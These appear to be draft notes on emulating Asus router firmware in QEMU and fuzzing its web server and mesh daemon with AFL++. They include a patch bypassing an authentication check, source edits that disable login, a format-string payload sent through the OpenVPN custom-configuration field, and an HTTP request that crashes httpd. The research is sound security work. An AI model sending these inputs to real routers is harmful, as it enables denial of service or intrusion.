---
title: "Asus, Qemu, AFL++ Notes"
date: 2022-12-29T01:00:00Z
draft: true
tags: ["afl", "asus", "qemu", "notes"]
---

This post is just a collection of my notes and experiences reversing, compiling and emulating Asus proprietary and Asuswrt-Merlin software, on an Ubuntu 20.04 box. It's a bit of a pain really, I thought it would be pretty easy but everything's been an issue, which is also what makes it sorta fun.

Worked primarily with https://github.com/RMerl/asuswrt-merlin.ng for the RT-AX88U router, but some binaries are just closed-source :/<!--more-->

----------

Various, helpful and unhelpful links:

qemu / Reversing:
- https://resources.infosecinstitute.com/topic/fundamentals-of-iot-firmware-reverse-engineering/
- https://gitbook.seguranca-informatica.pt/arm/reverse-iot-devices/reverse-asus-rt-ac5300#emulation-nvram
- https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu

AFL Examples:
- https://animal0day.blogspot.com/2017/05/fuzzing-apache-httpd-server-with.html
- https://mmmds.pl/cherokee-revisited-with-AFL/
- https://securitylab.github.com/research/fuzzing-apache-1/
- https://securitylab.github.com/research/fuzzing-sockets-FreeRDP/
- https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/

AFL Mutators
- https://aflplus.plus/docs/custom_mutators/
- https://github.com/AFLplusplus/Grammar-Mutator

#### Source, toolchain, compiling
First off, setup the system and build the toolchains as the directions show in merlin.ng: https://github.com/RMerl/asuswrt-merlin.ng/wiki/Compile-Firmware-from-source

#### Clone down arm static bins

- strace
- gdb
- etc

### NVRAM

One of the things that makes this such a pain is needing to get the nvram set up. I used Firmadyne's libnvram project for this: https://github.com/firmadyne/libnvram

#### Clone libnvram

`git clone https://github.com/firmadyne/libnvram.git`

Run this on router:

`admin@RT-AX88U-C100:/tmp/home/root# nvram getall`

Copy nvram values out, regex to fix for fimadyne's config.h format-- careful with ones that have "=" in em, e.g.

`ENTRY("http_passwd", nvram_set, "+S8a5usKANuNzKOaPXpI0Js0McOBF2Mgjz0/x9AR8YM") \`

Compile libnvram to ARM, copy into path

`arm-linux-gcc-5.5.0 -shared -nostdlib nvram.c -o libnvram.so -ldl && chmod 777 libnvram.so && cd ~/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs && cp ~/libnvram/libnvram.so firmadyne/`

Brutal regex thing for creating nvram files

`tester@asuserlin-ubuntu20:~/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs$ while read line; do test=$(echo $line | sed 's/ABAB.*//'); test2=$(echo $line | sed -E 's/.*ABAB//'); echo -n $test2 > "firmadyne/libnvram/$test" ; done < nvrams`

with nvrams file containing keys like `vpn_client5_portABAB1194`. Dumb, but it works

Script for rebuilding httpd and relaunching qemu with the updated version:

`cd ~/amng-build/release/src-rt-5.02axhnd && make httpd && cd targets/94908HND/fs && sudo cp /home/tester/amng-build/release/src/router/httpd/httpd usr/sbin/httpd && sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /bin/sh`

```bash
sudo chroot . ./qemu-arm-static /bin/sh
/ # export LD_PRELOAD=/firmadyne/libnvram.so && cd www && httpd
```

`sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /bin/sh`

still many nvram errors, just keep fixing them as they come up, or edit them out of source, I guess.

Annoying to deal with https stuff on stratup, commented out the https stuff

524d9c08074d62b145d44001c78f0e65


## cfg_server

First, created the directories I saw from a real Router, an AC-1900

```bash
mkdir etc/cfg_mount
touch etc/cfg_mount/cert.pem
touch etc/cfg_mount/key.pem
touch etc/cfg_mount/pubkey.pem
```

`nvram set cfg_syslog=1` creates some debug files in `/tmp/asusdebuglog/`

![nvram-1](images/cfg_syslog_nvramset.PNG)

Fought a bit more with nvram, created "debug_cprintf_file" key in libnvram.override/

```
3503008 semget(1094647810,1,0,17,-1,0) = 11
3503008 semctl(11,0,IPC_STAT,0xfffee410) = 0
3503008 semop(11,-72600,1,1672422623,-8805904,-8675096) = 0
3503008 write(2,0xfffebf48,67)nvram_get_buf: Unable to open key: /firmadyne/libnvram/cfg_syslog!
 = 67
3503008 write(1,0x9c5c0,13)Exit daemon!
```

This: `Unable to open key: /firmadyne/libnvram/cfg_syslog` means do this 
```
/fs $ sudo su
/fs # echo 1 > firmadyne/libnvram.override/cfg_syslog
/fs # echo 1 > firmadyne/libnvram/cfg_syslog
/fs # exit
```


Saw that the cprintf file now existed in tmp, full of entries like

```
[check_auth(72)]:This is not ASUS router

Error locking /tmp/asusdebuglog_lock_1156484.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[main(15700)]:auth check failed, exit

Error locking /tmp/asusdebuglog_lock_1156484.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[check_auth(72)]:This is not ASUS router

Error locking /tmp/asusdebuglog_lock_1156592.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[main(15700)]:auth check failed, exit
```

see this:

`[cm_task(10185)]:create a folder for cfg_mnt (/jffs/.sys/cfg_mnt/)`

do this:

`mkdir -p jffs/.sys/cfg_mnt`

seems like nothing changed lol

Took a look at the ghidra for this stuff

Found in FUN_00014300:
```C
iVar4 = FUN_0001e608();
if (iVar4 == 1) {
pcVar2 = (char *)func_nvram_Check-2("cfg_dbg");
iVar3 = strcmp(pcVar2,"1");
if (iVar3 == 0) {
cprintf("[%s(%d)]:auth check failed, exit\n",&DAT_000800e1,0x2860);
}
pcVar2 = (char *)func_nvram_Check-2("cfg_syslog");
iVar3 = strcmp(pcVar2,"1");
if (iVar3 == 0) {
uVar6 = 0x2860;
pcVar2 = "[%s(%d)]:auth check failed, exit\n";
goto LAB_00014464;
}
}
else { 
...
```

FUN_0001e608 == auth_check()

These debug logs made renaming functions in ghidra a breeze

![rename](images/renaming_func.PNG)

Line 31: checks auth_check return val, patched this to flip it by patching via ghidra

![patch-1](images/cfg_server_patch_1.PNG)

then exporting the program as an elf, writing it back to the file system *annnnd*:

```
[main(10340)]:auth check success

Error locking /tmp/asusdebuglog_lock_1157672.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[cm_task(10174)]:task start

Error locking /tmp/asusdebuglog_lock_1157700.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[cm_task(10185)]:create a folder for cfg_mnt (/jffs/.sys/cfg_mnt/)

Error locking /tmp/asusdebuglog_lock_1157700.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[cm_initKeyInfo(9622)]:open public PEM file : /etc/cfg_mnt/pubkey.pem ...

Error locking /tmp/asusdebuglog_lock_1157700.lock: 2 No such file or directory
---------asusdebuglog failed to lock file! -------
[cm_initKeyInfo(9648)]:Done
```

It worked! How cool. Now it's running, but it fails :((
```
----asusdebuglog no unlock ------------
[cm_generateGroupKey(9549)]:generate group key

----asusdebuglog no unlock ------------
[cm_addDutInfo(624)]:add DUT releated information

----asusdebuglog no unlock ------------
[chmgmt_get_chan_info(54)]:get chan info failed

----asusdebuglog no unlock ------------
[update_cost(777)]:lldp result(0)

----asusdebuglog no unlock ------------
[cm_updateOnboardingStatus(691)]:update onboarding status, obStatus(1), cfg_obstatus(0)

----asusdebuglog no unlock ------------
[cm_getChanspec(257)]:get chan info failed

----asusdebuglog no unlock ------------
[cm_getIfInfo(9784)]:get own address of br0 failed!

----asusdebuglog no unlock ------------
[cm_task(10273)]:get interface information failed

----asusdebuglog no unlock ------------
[...]
```

It bails out trying to get networking information for br0 -- looking at the ghidra, this checks out, fails in this section send it back to the entry point and exit

So, use netplan to rename interface to br0 as epxlained here:
https://askubuntu.com/questions/1317036/how-to-rename-a-network-interface-in-20-04

And! Now it's running >:D
```bash
➜  asus nmap -sT 192.168.1.180 -p0- -v --open
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 18:58 EDT
Initiating Ping Scan at 18:58
Scanning 192.168.1.180 [2 ports]
Completed Ping Scan at 18:58, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:58
Completed Parallel DNS resolution of 1 host. at 18:58, 0.00s elapsed
Initiating Connect Scan at 18:58
Scanning 192.168.1.180 [65536 ports]
Discovered open port 22/tcp on 192.168.1.180
Discovered open port 7788/tcp on 192.168.1.180
Completed Connect Scan at 18:58, 0.86s elapsed (65536 total ports)
Nmap scan report for 192.168.1.180
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
7788/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
```

Looking at the cprintf log file, now seeing more stuff, and some stuff about received packets:
```
----asusdebuglog no unlock ------------
[cm_rcvUdpHandler(196)]:own addr 192.168.1.180

----asusdebuglog no unlock ------------
[cm_rcvUdpHandler(202)]:got packet from 192.168.1.2

----asusdebuglog no unlock ------------
[cm_processConnDiagPkt(298)]:process packet (5)

----asusdebuglog no unlock ------------
[cm_selectGroupKey(3980)]:gKeyTime(312), gKey1Time(1665445160), groupKeyExpireTime(3600), rekeyTime(3150)

----asusdebuglog no unlock ------------
[cm_selectGroupKey(3988)]:gKey1Time > groupKeyExpireTime, select key

----asusdebuglog no unlock ------------
[cm_selectGroupKey(3980)]:gKeyTime(312), gKey1Time(1665445160), groupKeyExpireTime(3600), rekeyTime(3150)

----asusdebuglog no unlock ------------
[cm_selectGroupKey(3988)]:gKey1Time > groupKeyExpireTime, select key1

----asusdebuglog no unlock ------------
[cm_aesDecryptMsg(82)]:Failed to aes_decrypt() by key!!!

----asusdebuglog no unlock ------------
[cm_aesDecryptMsg(85)]:key1 is NULL !!!

----asusdebuglog no unlock ------------
[cm_processREQ_CHKSTA(202)]:Failed to aes_decrypt() !!!

----asusdebuglog no unlock ------------
[cm_processConnDiagPkt(300)]:fail to process corresponding packet
```

![running-keyFail](images/cprintf_log_packetrecv.PNG)

First calls `cm_rcvUdpHandler()`, believe this is triggered by the router at 192.168.1.2, it's preiodically broadcasting a message on UDP/7788 so this makes sense

Can enable better debugging by creating the following nvrams

```
cfg_syslog
cfg_dbg
asuslog_debug_test
debug_cprintf_file

touch tmp/cfg_mnt.log
touch tmp/asusdebuglog/cfg_mnt.log
```

Alright, so looking at the above, we see what's happening, some sort of key / encryption issue based on the key times
```
----asusdebuglog no unlock ------------
[cm_selectGroupKey(3980)]:gKeyTime(312), gKey1Time(1665445160), groupKeyExpireTime(3600), rekeyTime(3150)

----asusdebuglog no unlock ------------
[cm_selectGroupKey(3988)]:gKey1Time > groupKeyExpireTime, select key1

----asusdebuglog no unlock ------------
[cm_aesDecryptMsg(82)]:Failed to aes_decrypt() by key!!!
```

So, the "gKey1Time" epoch timestamps is 1665578564, or, the current time.

Maybe can generate a fake key or something?

### AFL -> cfg_server

Can use defork  and desock from preeny
`sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so:/desock.so:/defork.so /usr/sbin/cfg_server`

^ runs... exits, doesn't seem to work

Need to get this accepting from stdin

Need a seed, previously captured some 7788/udp traffic

[...]

returning to this...

So deforking with preeny works well, but desock'ing does not. Gonna try libdesock.so from https://github.com/fkie-cad/libdesock

Will have to fight for cross compiling this I guess, ugh

Anyway, I'm able to run it and send data like so:

`chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so:/defork.so /usr/sbin/cfg_server`

and it hangs out running, so I can send via nc

`nc 127.0.0.1 7788 < 1`

which yields 

```
[cm_rcvUdpHandler(202)]:got packet from 192.168.1.2
[cm_processConnDiagPkt(298)]:process packet (5)
[cm_selectGroupKey(3980)]:gKeyTime(90), gKey1Time(1673116928), groupKeyExpireTime(3600), rekeyTime(3150) ,[cm_selectGroupKey(3988)]:gKey1Time > groupKeyExpireTime, select key
[cm_selectGroupKey(3980)]:gKeyTime(90), gKey1Time(1673116928), groupKeyExpireTime(3600), rekeyTime(3150)
[cm_selectGroupKey(3988)]:gKey1Time > groupKeyExpireTime, select key1
[cm_aesDecryptMsg(82)]:Failed to aes_decrypt() by key!!!
[cm_aesDecryptMsg(85)]:key1 is NULL !!!
[cm_processREQ_CHKSTA(202)]:Failed to aes_decrypt() !!!
[cm_processConnDiagPkt(300)]:fail to process corresponding packet
[cm_rcvTcpHandler(9261)]:enter
[cm_rcvTcpHandler(9290)]:leave
 ```

where `xxd 1`

```
00000000: 4500 021c 94db 4000 4011 e199 c0a8 01b4  E.....@.@.......
00000010: ffff ffff 270f 270f 0208 d8ab 0c16 1f00  ....'.'......... // Packet data starts @ 0C 16
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 4361 7420 456d 7069 7265 0000  ....Cat Empire..
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 3235 352e 3235 352e 3235 352e  ....255.255.255.
000000d0: 3000 0000 0000 0000 0000 0000 0000 0000  0...............
000000e0: 0000 0000 5254 2d41 5838 3855 0000 0000  ....RT-AX88U....
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 332e 302e 302e 342e 3338 3600  ....3.0.0.4.386.
00000110: 0000 0000 003c 7c3f 53c1 0000 0000 0000  .....<|?S.......
00000120: 0000 0000 0000 0000 0000 0000 8280 5900  ..............Y.
00000130: 0000 3038 0000 0000 0000 0000 0000 0000  ..08............
00000140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000170: 0000 0000 00b4 01a8 c000 0000 0000 0000  ................
00000180: 0000 0000 0000 0000 0000 0000 0000 1500  ................
00000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001b0: 0000 0100 3366 6665 3531 3037 3833 6133  ....3ffe510783a3
000001c0: 6638 6531 3263 3665 3062 6466 3737 6339  f8e12c6e0bdf77c9
000001d0: 3136 3846 0a00 0000 0000 0000 0000 0000  168F............
000001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001f0: 0000 0000 3c7c 3f53 c100 0000 0000 0000  ....<|?S........
00000200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000210: 0000 0000 0000 0000 0000 0000            ............
```

so it's clearly working, but how do I desock it or fuzz it like this?

Giving aflnet a shot, just wanna get something working, https://github.com/aflnet/aflnet 

SImilar setup as normal AFL, pull down, `make clean all`, then `cd qemu_mode && ./build_qemu_support.sh`

### ldpreloadhook

desock won't work because of `ioctl` calls to get interface info, can trace the errors to it in ghidra

```
[cm_getIfInfo(9784)]:get own address of br0 failed!
[cm_task(10273)]:get interface information failed
```

trying `ldpreloadhook` to hook the calls and see what's happening

can probably preload ioctl with the calls, similar to desock, etc

`$ arm-linux-gcc-5.5.0 -shared -nostdlib -o hook.o hook.c -ldl && chmod +x hook.o && sudo cp hook.o ../amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs/`

qemu with defork:
`$ sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so:/desock.so:/defork.so:/hook.o /usr/sbin/cfg_server` 

qemu w/out defork:
`sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so:/desock.so:/hook.o /usr/sbin/cfg_server`

hooks cool shit, easy way to see mallocs / frees, can see ioctl calls

```
nvram_get_buf: = "eth7"
HOOK: malloc( size=5 )
HOOK: strlen( "per_chan_info" ) returned 13
HOOK: closed file descriptor (fd=4)
HOOK: malloc( size=4 )
HOOK: malloc( size=4 )
HOOK: ioctl (fd=3, request=0x89f0, argp=0xfffec750 [00])
Unsupported ioctl: cmd=0x89f0
eth7: WLC_GET_VAR(per_chan_info): Function not implemented
HOOK: closed file descriptor (fd=3)
```


fucking WOW forgot all about boofuzz

### boofuzz




## httpd

First for debugging-- 

`touch /tmp/HTTPD_DEBUG`

Enables debug mode, writing HTTPD_DEBUG info to /jffs/HTTPD_DEBUG

The httpd crash is from sending a digit as the first character of the payload body happens in httpd.c, around line 1605 in `handler->output(file, conn_fp);`
```C
}
if (strcasecmp(method, "head") != 0 && handler->output) {
    printf("FFFFFFFFFFFF\r\n", 16);
    handler->output(file, conn_fp);
    printf("GGGGGGGGGGGG\r\n", 16);
}
break;
}
```

Out:
```
FFFFFFFFFFFF
nvram_get_buf: preferred_lang
sem_get: Key: 410d0002
sem_get: Key: 410d0002
nvram_get_buf: = "EN"
nvram_get_buf: odmpid
sem_get: Key: 410d0002
sem_get: Key: 410d0002
nvram_get_buf: = ""
nvram_get_buf: rc_support
sem_get: Key: 410d0002
sem_get: Key: 410d0002
nvram_get_buf: = "mssid 2.4G 5G update usbX2 switchctrl manual_stb 11AX pwrctrl WIFI_LOGO nandflash smart_connect movistarTriple wifi2017 app ofdma wpa3 reboot_schedule ipv6 ipv6pt PARENTAL2 dnsfilter dnspriv dualwan pptpd openvpnd utf8_ssid printer modem webdav rrsut clou"
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)
/www #
```

Set up host system to enable core dumps with `ulimit -c unlimited` and `echo core > ...` or whatever, as indicated by AFL

can directly run httpd with qemu-user mode

`sudo chroot ../ ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so -E PWD=/www /usr/sbin/httpd`

PWD env var doesnt seem to work, trying symlink

`cp --symbolic-link www/* .`

^ worked well enough, getting expected responses, including crash

`sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /usr/sbin/httpd`

Now to set up afl++? Need to get the bin accepting requests from stdin, and exit after the request is handled

Modified source to exit after request is handled:
```C
if(filter_ban_ip())
{
    printf("AAAAAAAAAAAA\r\n", 16);
    handle_request();
    exit(1);
    printf("BBBBBBBBBBBB\r\n", 16);
}
```

That defo works

took a lot of work but I got the bin reading in and processing requests from files, still fighting with the output though, its writing to the same file used as input, which appends it with the response and for some reason does not crash?

OK, after more editing I realized it is very simple to get httpd accepting requests from stdin:

within `handle_request()`, near it's declaration you need to add:
```C
  /* Parse the first line of the request. */
	conn_fp = fopen(inputFile, "r+"); // <-- this
```

and in main():
```C
int main(int argc, char **argv)
{
usockaddr usa;
int listen_fd[3];
fd_set active_rfds;
conn_list_t pool;
int i, c;
//int do_ssl = 0;

inputFile = argc[argv - 1]; // Add this
handle_request(); // and this
fprintf(stderr, "Exit handle_request()\n"); // meh
exit(1); // and this

[...]
```

Sttill a few issues but the io works:

```bash
$ cat http_request
GET / HTTP/1.0
Host: 192.168.1.180:80


$ sudo chroot . ./qemu-arm-static -E LD_PRELOAD=/firmadyne/libnvram.so /usr/sbin/httpd /http_request
[...]
nvram_unset: httpd_handle_request
sem_get: Key: 415f0002
sem_get: Key: 415f0002
nvram_unset: httpd_handle_request_fromapp
sem_get: Key: 415f0002
sem_get: Key: 415f0002
Exit handle_request()

$ cat http_request
GET / HTTP/1.0
Host: 192.168.1.180:80

HTTP/1.0 404 Not Found
Server: httpd/2.0
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
Date: Mon, 19 Dec 2022 15:33:14 GMT
Content-Type: text/html
Connection: close

<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD>
<BODY BGCOLOR="#cc9999"><H4>404 Not Found</H4>
File not found.
</BODY></HTML>
```

It's writing it's output after the input, and *doesn't* crash. Not sure if that's good or bad for this, probably bad, but I still fuzzed.

### Extra httpd.c source modification notes

A couple changes need to be made to the source in addition to the above stuff

1. Disable cert creation / SSL stuff, line 2379, httpd.c:
```C
#ifdef RTCONFIG_HTTPS
	//if (do_ssl)
		//start_ssl(http_port); //Comment this out
#endif
```

2. Disable Auth:
Comment out all `send_login_page` calls in httpd.c, e.g.
```C
// if(login_state==3 && !fromapp) { // few pages can be shown even someone else login
// 	 if(handler->auth || (!strncmp(file, "Main_Login.asp", 14) && login_error_status != 9) || mime_exception&MIME_EXCEPTION_NOPASS)
// 	{
// 		if(strcasecmp(method, "post") == 0 && handler->input)	//response post request
// 			while (cl--) (void)fgetc(conn_fp);

// 		send_login_page(fromapp, NOLOGIN, NULL, NULL, 0, NOLOGINTRY);
// 		return;
// 	}
// }
```

3. Match + Replace rule in burp
Lastly, some DOM crap happens which redirects you to the change password page by default, easy to fix, just make a burp match/replace rule for:
`var notice_pw_is_default = '1';` replaced to `var notice_pw_is_default = '0';`


### format string - Advanced_VPN_OpenVPN.asp

Sending this within the Custom Configuration:
```
push "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
push "%4881$p"
```
results in this in the syslog:
```
# cat /etc/openvpn/server1/config.ovpn
...
# Custom Configuration
push "AAAA0x43843c000xffa290800xffa290840xffa29088(nil)0xf7546ab8(nil)(nil)(nil)0xffa290ac(nil)0xf7546ab80x10xffa290ac0x5f6e70760x767265730x5f317265(nil)"
push "(nil)"
```

stack to 4881 is mostly null, 4882 first values I noticed

```
# Custom Configuration
push "AAAA0x43843c000xffa290800xffa290840xffa29088(nil)0xf7546ab8(nil)(nil)(nil)0xffa290ac(nil)0xf7546ab80x10xffa290ac0x5f6e70760x767265730x5f317265(nil)"
push "0x4c"
```







### AFL -> httpd

Used afl++ in qemu mode to begin fuzzing the httpd bin using a few example requests and a dictionary file from: https://github.com/antonio-morales/Apache-HTTP-Fuzzing

install AFLplusplus: https://aflplus.plus/building/

Compile for QEMU with arm support:

`~/AFLplusplus/qemu_mode$ CPU_TARGET=arm ./build_qemu_support.sh`

Using mime_handlers and httpd.c and httpd.h I created a small dictionary which contains the contents of /www/, common headers, specific headers and anything else interesting, based off of the dict mentioned above

Then:

`/fs$ QEMU_LD_PREFIX=/home/tester/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs/ /home/tester/AFLplusplus/afl-fuzz -Q -i /home/tester/afl-in/ -o /home/tester/afl-out/ -x /home/tester/http.dict -- usr/sbin/httpd @@`

![afl-2](images/afl-2-httpd-broadcasts.PNG)

This works... sorta, but since AFL is built for fuzzing random binary data it's not "context aware" and has no idea how to fuzz data with any structure, or grammar, so it just throws fuck all at it and watches what happens.

With a dictionary AFL does encounter some valid requests, and lots of broadcasts are sent in some cases:

![broadcast-1](images/afl-2-httpd-broadcasts.PNG)

To perform more targetted fuzzing for languages like HTTP, which expect requests to be in specific formats and are parsed for specific keywords and structures, there are cool AFL tools like [Grammar Mutator](https://github.com/AFLplusplus/Grammar-Mutator). 

### Custom Mutators-- teaching AFL http

Followed tutorials on custom grammar:
https://github.com/AFLplusplus/Grammar-Mutator

Cloned mutator to AFL dir

`export AFL_CUSTOM_MUTATOR_LIBRARY=/home/tester/AFLplusplus/Grammar-Mutator/libgrammarmutator-http.so`
`export AFL_CUSTOM_MUTATOR_ONLY=1`

ended up just running commands and just including the mutator var

edit mutator to be more targeted-- this is so sick, then

`make GRAMMAR_FILE=grammars/http.json`

generate the trees and seeds (can do more than 100)

`./grammar_generator-http 100 1000 ./seeds ./trees`

Now, copy the trees into the session directory

`cp -r trees/ ~/afl-out/http-1` etc...

kicked it off with seeds

`$ AFL_CUSTOM_MUTATOR_LIBRARY=/home/tester/AFLplusplus/Grammar-Mutator/libgrammarmutator-http.so AFL_CUSTOM_MUTATOR_ONLY=1 QEMU_LD_PREFIX=/home/tester/amng-build/release/src-rt-5.02axhnd/targets/94908HND/fs/ /home/tester/AFLplusplus/afl-fuzz -Q -i /home/tester/AFLplusplus/Grammar-Mutator/seeds/ -o /home/tester/afl-out/ -M http-1 -- usr/sbin/httpd @@`

Still seeing broadcasts 

![broadcast-2](images/afl-4-httpd-withGRAMMAR-mutators-tuning.PNG)

Constant tuning of grammar, creating  "definitions" for the data structure I'd like to fuzz. It's begun to get a little unwieldly as I began to add more and more POST and GET params, so I'm seeing the benefits of having fuzzers hitting specific functionality only. This makes sense as it's more of a targetted approach than casting a wide net, making it possible to fuzz individual requests very thoroughly. It's probably possible to create one giant definition file for the grammar stuff but I think it wastes a LOT of cycles touching stuff that is useless.

So, I began to rewrite the grammar for requests which I've found vulns in already.

After some finagling, have a seemingly solid test case generator for the apps_test.asp page. I think I may need to work on the content-length header tho, make it dynamic on the length of POST body

http-apps_test.json

```
$ cat seeds/28
POST /apps_test.asp?F=f HTTP/0.9
Authorization: /apps_test.asp?w=t


apps_action=enable&apps_action=remove&apps_action=update&
```

Neat, that was generated by a more specific http.json format! Need to figure out the length of the body for Content-Length 

As I get more specific in my grammar mutation I'm also finding overlap between tools like AFL and Burp, which is interesting

### Crash Update

The below request causes a segfault :') woohoo

```html
GET /Main_Login.asp HTTP/1.0
Host: 192.168.1.180:80
Content-Length: 4

0000
```

fuzzing with a dict does get some crashes pretty quickly, have four workers going, as of writing this, there are ~7 similar crashes

I left it running for a couple days this time, confident at least the crashes I expected were happening. Over the few days it ran AFL was able to cause and save 205 crashes. The majority are moslty garbage-- huge requests or just non-ASCII stuff that gets generated by AFL when it is left to it's own devices. Check it out:

Garbage "crash" (2873 lines O_O):
```
$ cat ~/afl-out/http-4/crashes/id\:000041\,sig\:11\,src\:000414+000778\,time\:32213464\,execs\:27016271\,op\:splice\,rep\:2
[...]
Host: 192F168t.asp
H.asp
Hgth:0:80
Cont:80
Co t
HoZtI 1nt.asp
8�:80
Transfer-E
HoZt:92s:80
a�p
HoZ
$ cat ~/afl-out/http-4/crashes/id\:000041\,sig\:11\,src\:000414+000778\,time\:32213464\,execs\:27016271\,op\:splice\,rep\:2 | wc -l
2873
```

Or this one... it's almost an HTTP request?

```
$ cat ~/afl-out/http-4/crashes/id\:000004\,sig\:11\,src\:000474\,time\:1066760\,execs\:878783\,op\:havoc\,rep\:16
GET /start_apply2.htm    A  !  sp
Host:clop 1%-?+�                        ys`o        `�              sp
Host:clop 1%-?+�b%Es /Mainqi�/AmPqotect��GEf /Ma                   sp
H.0
Host: 192.   0                �gin.aspu&modemHost:�lnge_location.cgiGET
+ou
Content-Length:14

5+++++++
```

And, we see some that are clearly "valid" HTTP requests and are effectively what I had hoped to see to guarantee everything is "working". "Working" means crashing, lol

```
cat ~/afl-out/http-4/crashes/id\:000001\,sig\:11\,src\:000000\,time\:17901\,execs\:4760\,op\:havoc\,rep\:4
GET /Main_Login.asp �ost: 192.168.1.180:Ha
Content-Length: 4

0
```

So, why did AFL save *so many* of these crashes? Most aren't unique from one another or at least I don't think they are, but the whole goal is to find a useable crash, so I began triaging to see if anything stuck out. 

### Crash troubleshooting 

So, let's take a look at two of these crashes. They are generated from the following two HTTP requests-- the first one I found through various testing, the second was found by AFL, as planned.

`known_crash`:
```
GET /Main_Login.asp HTTP/1.0
Host: 192.168.1.180:80
Content-Length: 4

0000
```

`http_request`:
```
GET /get_ig_config.cgi
HostGET �upload_cert_key.�giGET
Content-Length:54

2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222de-ch2a
GET /Main_Login.aspAdvance
```

Running gdb-multiarch with the binary and associated coredumps:

`http_request` crash:
```
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230101-134448_1803079.core
Reading symbols from usr/sbin/httpd...
[New LWP 1803079]

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Core was generated by `
                       ������'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000444b4 in do_json_decode ()
(gdb) bt
#0  0x000444b4 in do_json_decode ()
#1  0x00047714 in do_get_ig_config_cgi ()
#2  0x00019c5c in handle_request ()
#3  0x00016ef8 in main ()
(gdb)
```

`known_crash` crash:
```
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230101-134349_1803037.core
Reading symbols from usr/sbin/httpd...
[New LWP 1803037]

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Core was generated by `������'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000444b4 in do_json_decode ()
(gdb) bt
#0  0x000444b4 in do_json_decode ()
#1  0x0001b390 in do_ej (path=<optimized out>, stream=0x0) at ej.c:309
#2  0x00019c5c in handle_request ()
#3  0x00016ef8 in main ()
(gdb)
```

Both stem from `do_json_decode` though no backtrace info beyond that is available as it wasn't compiled with debug symbols (-g):
```
(gdb) bt full
#0  0x000444b4 in do_json_decode ()
No symbol table info available.
#1  0x00047714 in do_get_ig_config_cgi ()
No symbol table info available.
#2  0x00019c5c in handle_request ()
No symbol table info available.
#3  0x00016ef8 in main ()
No symbol table info available.
```

Quick fix:

../src/router/httpd/Makefile:342
```Makefile
httpd: $(OBJS)
        @echo " [httpd] CC $@"
        $(CC) -g -o $@ $(OBJS) $(LIBS) $(EXTRALDFLAGS)
```
Annnddd.. recompile

Alright, so now the `known_crash-1` file's core dump (with `-g`) looks like this:

```
# gdb-multiarch -q usr/sbin/httpd qemu_httpd_20230101-143447_1811053.core
Reading symbols from usr/sbin/httpd...
[New LWP 1811053]

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
Core was generated by `������'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000444b4 in do_json_decode ()
(gdb) bt full
#0  0x000444b4 in do_json_decode ()
No symbol table info available.
#1  0x0001b390 in do_ej (path=<optimized out>, stream=0x0) at ej.c:309
        pat_buf = '\000' <repeats 484 times>...
